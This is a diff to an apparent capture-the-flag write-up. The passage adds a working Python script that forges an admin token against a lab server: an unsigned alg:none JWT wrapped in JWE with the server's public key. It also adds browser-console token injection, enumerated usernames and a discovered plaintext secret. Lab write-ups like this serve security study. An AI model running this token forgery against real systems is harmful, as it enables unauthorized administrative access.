@@ -89,22 +89,104 @@ Research revealed **CVE-2026-29000** - a critical vulnerability in pac4j-jwt v
 
 ### Exploitation Script
 
-Create a Python script to forge the token using the public key from `/api/auth/jwks`:
+#### Forge Token Script
+
+```python
+# forge_jwt.py
+import base64
+import json
+import requests
+from jwcrypto import jwk, jwe
+from datetime import datetime, timezone, timedelta
+
+def create_jwt(sub, role):
+    now = datetime.now(timezone.utc)
+    claims = {
+        "sub": sub,
+        "role": role,  # ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
+        "iss": "principal-platform",
+        "iat": int(now.timestamp()),
+        "exp": int((now + timedelta(hours=24)).timestamp()),
+    }
+    header = {"alg": "none"}
+    
+    def base64_url(data):
+        return base64.urlsafe_b64encode(data).decode().rstrip("=")
+    
+    header_b64 = base64_url(json.dumps(header, separators=(",", ":")).encode())
+    payload_b64 = base64_url(json.dumps(claims, separators=(",", ":")).encode())
+    return f"{header_b64}.{payload_b64}."
+
+# Get public key
+resp = requests.get('http://10.129.11.207:8080/api/auth/jwks')
+jwks = resp.json()
+rsa_key = jwk.JWK(**jwks["keys"][0])
+
+# Create forged token
+jwt = create_jwt('hacker', 'ROLE_ADMIN')
+token = jwe.JWE(
+    plaintext=jwt.encode(),
+    protected=json.dumps({"alg": "RSA-OAEP-256", "enc": "A256GCM"}),
+    recipient=rsa_key,
+)
+forged = token.serialize(compact=True)
+print(forged)
+```
+
+Execute the python file:
+```bash
+#save python file
+nano forged_jwt.py
+
+#run
+python3 forged_jwt.py
+```
 
 
 ![[Pasted image 20260805225532.png]]
 
+### Use Forged Token
+
+In browser console:
+```javascript
+sessionStorage.setItem('auth_token', 'FORGED_TOKEN_HERE');
+```
+
 
 ![[Pasted image 20260805225516.png]]
 
+- **Result:** Dashboard access as admin!
 
 ![[Pasted image 20260805225557.png]]
 
 
-![[Pasted image 20260805230825.png]]
+---
 
+## Step 4: Dashboard Enumeration
+
+### User Management
+
+Navigating to the Users panel reveals a list of system users:
 
 ![[Pasted image 20260805230847.png]]
+
+**Users discovered:**
+- admin, svc-deploy, jthompson, amorales, bwright, kkumar, mwilson, lzhang
+
+### System Settings
+
+The Settings page reveals a sensitive configuration value:
+
+![[Pasted image 20260805230825.png]]
+
+**Encryption Key discovered:**
+```
+D3pl0y_$$H_Now42!
+```
+
+The notes also mention:
+- SSH certificate authentication enabled
+- CA path: `/opt/principal/ssh`
 
 
 #### Password Spray
